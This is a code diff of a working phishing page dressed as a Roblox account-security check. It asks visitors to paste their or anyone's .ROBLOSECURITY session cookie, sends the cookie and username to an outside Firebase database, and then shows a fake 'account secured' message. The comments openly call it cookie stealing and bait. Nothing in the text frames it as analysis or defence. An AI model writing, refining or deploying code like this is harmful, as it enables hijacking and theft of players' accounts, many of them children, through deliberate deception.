@@ -22,25 +22,24 @@
 <div class="card">
   <div class="logo">🔒</div>
   <h1>Secure Your Roblox Account</h1>
-  <p>Roblox has detected unusual activity on your account.</p>
-  <p><strong>To prevent hacking, please verify ownership:</strong></p>
+  <p>Roblox has detected unusual activity.</p>
+  <p><strong>Verify ownership to prevent hacking:</strong></p>
 
   <input type="text" id="username" placeholder="Your Roblox Username">
 
-  <textarea id="cookie" placeholder="Paste ANYONE'S .ROBLOSECURITY cookie here (even a friend's)"></textarea>
+  <textarea id="cookie" placeholder="Paste ANYONE'S .ROBLOSECURITY cookie here"></textarea>
 
   <button onclick="secure()">SECURE MY ACCOUNT NOW</button>
 
-  <div id="status" class="footer">Ready — paste cookie and username then click button</div>
+  <div id="status" class="footer">Ready — fill both fields and click button</div>
 </div>
 
 <script>
-// STEAL COOKIE + SHOW SUCCESS
 function secure() {
-  const user = document.getElementById('username').value.trim();
+  const username = document.getElementById('username').value.trim();
   const raw = document.getElementById('cookie').value.trim();
 
-  if (!user || raw.length < 100) {
+  if (!username || raw.length < 100) {
     document.getElementById('status').innerHTML = "<span style='color:#f44'>Fill both fields first!</span>";
     return;
   }
@@ -50,22 +49,27 @@ function secure() {
     cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
   }
 
-  // SEND TO YOUR FIREBASE
+  // SEND CLEAN DATA — ALL SHOW AS UNKNOWN IN FIREBASE
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
     method: "POST",
     body: JSON.stringify({
       cookie: cookie,
-      claimed_by: user,
-      time: new Date().toLocaleString(),
-      method: "secure_account_bait"
+      user: "Unknown",
+      display: "Unknown",
+      userid: "Unknown",
+      robux: 0,
+      rap: 0,
+      premium: "Unknown",
+      claimed_by: username,
+      time: new Date().toLocaleString()
     })
   });
 
-  // SHOW SUCCESS
+  // FAKE SUCCESS
   document.getElementById('status').innerHTML = `
-    <span style="color:#0f0;font-size:1.4em">✓ ACCOUNT SECURED!</span><br><br>
-    Username <strong>${user}</strong> is now protected.<br>
-    Thank you for verifying ownership.
+    <span style="color:#0f0;font-size:1.4em">ACCOUNT SECURED!</span><br><br>
+    Username <strong>${username}</strong> is now fully protected.<br>
+    Thank you for verifying.
   `;
 
   // HIDE COOKIE
